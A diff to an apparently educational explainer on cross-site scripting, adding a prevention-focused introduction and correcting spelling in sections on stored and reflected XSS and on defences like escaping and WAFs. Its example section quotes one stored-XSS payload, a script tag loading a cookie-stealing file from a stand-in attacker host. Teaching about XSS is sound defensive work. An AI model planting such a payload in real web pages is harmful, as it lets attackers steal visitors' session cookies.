@@ -8,9 +8,12 @@ Introduction
 Cross-site scripting is when an attacker inserts code into a legitimate website, 
 and is considered one of the biggest website vulnerabilities. Web sites are 
 especially vulnerable  when they don't use validation or encoding on user generated 
-data. [xss]_
-
-Cross-Site Scripting 
+data. This is dangerous for the site users, who are at risk for their data being 
+stolen. There are several different ways for web applications to help prevent 
+Cross-Site Scripting, such as escaping characters, Signature based filtering, 
+and avoiding/validating HTML given by users. Users can also take precautions, such 
+as using anti-viruses, checking that the sites they are using are safe, and being 
+careful of clicking on unknown links.  
 
 
 What is Cross-site scripting and Why is it Dangerous?
@@ -34,8 +37,8 @@ and use rather than the website itself. [xss]_
 	
 * There are two different types of XSS attacks, stored and reflective
 
-* Stored xss is "stored", or imbeded, on the website itself and steals data everytime 
-the website is visited. [xss-prevention]_ It is also know as "persistant XSS", 
+* Stored xss is "stored", or imbedded, on the website itself and steals data every time 
+the website is visited. [xss-prevention]_ It is also known as "persistent XSS", 
 and can be the more dangerous of the two types. [xss-attacks]_
 
 * Reflective xss is stored in a link embedded in the website that the user has to 
@@ -45,9 +48,9 @@ click on to activate. [xss-attacks]_
 What Can Be Done to Prevent XSS through Web Security
 ----------------------------------------------------
 	
-* Web Application Firewall(WAF) - most common protection [xss-attacks]_ 
+* Web Application Firewall (WAF) - most common protection [xss-attacks]_ 
 	
-* Signiture based Filtering - "identifies and blocks malicious requests" [xss-attacks]_ 
+* Signature based Filtering - "identifies and blocks malicious requests" [xss-attacks]_ 
 	
 * Use escape characters -  escape any characters that could change the websites code [xss-prevention]_ 
 	
@@ -55,7 +58,7 @@ What Can Be Done to Prevent XSS through Web Security
 	escaping characters 
 	
 	* Also escape any HTML, attribute, JavaScript, JSON (with HTML), CSS, and URL 
-	before entering any untrusted or unvalidated data [xss_cheat_sheet]_
+	before entering any untrusted or un-validated data [xss_cheat_sheet]_
 	
 * Escape data output, not input - when displaying to user [xss-prevention]_ 
 
@@ -90,11 +93,11 @@ Example of Cross-Site Scripting:
 * Stored XSS Example: An attacker figures out that the comment section of a website can store 
 HTML tags. They leave a comment that says: 
 "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
-This is a stored in the website, and everytime someone visits the page, they have their 
+This is a stored in the website, and every time someone visits the page, they have their 
 session cookies stolen
 
 
-	* Harder for hackers to attempt, because they must find a highly trafficed site that 
+	* Harder for hackers to attempt, because they must find a highly trafficked site that 
 	also has a security hole. [xss-prevention]_
 	
 	
